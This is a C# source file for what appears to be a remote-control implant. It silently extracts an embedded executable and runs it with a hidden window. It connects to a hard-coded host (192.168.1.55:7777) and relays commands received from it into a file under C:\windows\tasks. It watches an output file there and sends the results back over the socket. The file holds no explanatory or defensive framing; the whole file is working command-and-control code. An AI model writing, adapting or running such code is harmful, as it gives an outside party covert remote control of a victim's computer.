using System;
using System.IO;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;
using System.Reflection;

namespace tcp_client_file_write
{
    internal class Program
    {
        static string ip = "192.168.1.55";
        static int port = 7777;
        static int connectAttempts = 5;
        // TCP -> FILE -> TCP
        //  fromTCP -> toFile -> fromFile -> toTCP
        static TcpClient tcpClient;
        static FileSystemWatcher watcher;
        static FileStream fileOutStream;
        static FileStream fileInStream;
        static Stream tcpStream;
        static StreamReader fromTCP;
        static StreamWriter toFile;
        static StreamReader fromFile;
        static StreamWriter toTCP;
        static string watcherDir = "C:\\windows\\tasks";
        static string fileIn = "C:\\windows\\tasks\\command.txt";
        static string fileOut = "C:\\Windows\\tasks\\output.txt";

        static void Main(string[] args)
        {
            string startupFilePath = Path.Combine(Path.GetTempPath(), "startup.exe");
            ExtractAndRunEmbeddedResource("simplers.inputfile.exe", startupFilePath);

            createFile(fileOut);
            createFile(fileIn);
            try
            {
                using (TcpClient tcpClient = TcpConnect(ip, port))
                {
                    tcpStream = tcpClient.GetStream();
                    using (fromTCP = new StreamReader(tcpStream, Encoding.UTF8))
                    {
                        using (toTCP = new StreamWriter(tcpStream, Encoding.UTF8))
                        {
                            startWatcher(watcherDir, "output.txt");
                            string cmd;
                            while (true)
                            {
                                try
                                {
                                    cmd = fromTCP.ReadLine();
                                    writeToFile(fileIn, cmd);
                                }
                                catch { break; }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                System.Environment.Exit(100);
            }
        }

        public static void createFile(string filePath)
        {
            try
            {
                FileStream fs = File.OpenWrite(filePath);
                fs.SetLength(0);
                fs.Close();
            }
            catch
            {
                return;
            }
        }

        public static void writeToFile(string filePath, string data)
        {
            int attempts = 60;
            int interval = 100;
            while (attempts > 0)
            {
                try
                {
                    File.WriteAllText(filePath, data);
                    break;
                }
                catch (Exception ex)
                {
                    System.Threading.Thread.Sleep(interval);
                    attempts--;
                    if (attempts == 0)
                    {
                        System.Environment.Exit(1);
                    }
                }
            }
        }

        public static void startWatcher(string dir, string filter)
        {
            try
            {
                watcher = new FileSystemWatcher(dir);
                watcher.NotifyFilter = NotifyFilters.Attributes |
                NotifyFilters.CreationTime |
                NotifyFilters.FileName |
                NotifyFilters.LastWrite |
                NotifyFilters.Security |
                NotifyFilters.Size;

                watcher.Filter = filter;
                watcher.Changed += new FileSystemEventHandler(OnChanged);
                watcher.EnableRaisingEvents = true;
            }
            catch (Exception ex)
            {
                watcher.Dispose();
                System.Environment.Exit(1);
            }
        }

        public static TcpClient TcpConnect(string ip, int port)
        {
            TcpClient client = new TcpClient();
            while (connectAttempts != 0)
            {
                try
                {
                    client.Connect(ip, port);
                    break;
                }
                catch (Exception ex)
                {
                    System.Threading.Thread.Sleep(5000);
                    connectAttempts--;
                    if (connectAttempts == 0)
                    {
                        client.Close();
                        System.Environment.Exit(1);
                    }
                }
            }
            return client;
        }

        public static void OnChanged(object source, FileSystemEventArgs e)
        {
            watcher.EnableRaisingEvents = false;
            int attempts = 60;
            int interval = 100;
            string data;

            while (attempts > 0)
            {
                try
                {
                    System.Threading.Thread.Sleep(interval);
                    data = File.ReadAllText(fileOut);
                    File.WriteAllText(fileOut, string.Empty);
                    byte[] info = new UTF8Encoding(true).GetBytes(data);
                    tcpStream.Write(info, 0, info.Length);
                    tcpStream.Flush();
                    watcher.EnableRaisingEvents = true;
                    break;
                }
                catch (Exception ex)
                {
                    System.Threading.Thread.Sleep(interval);
                    attempts--;
                    if (attempts == 0)
                    {
                        data = "";
                        watcher.EnableRaisingEvents = true;
                    }
                }
            }
        }

        public static void ExtractAndRunEmbeddedResource(string resourceName, string outputPath)
        {
            try
            {
                using (Stream resourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    if (resourceStream == null)
                        throw new Exception("Resource not found.");

                    using (FileStream fileStream = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
                    {
                        resourceStream.CopyTo(fileStream);
                    }
                }

                Process process = new Process();
                process.StartInfo.FileName = outputPath;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }
    }
}

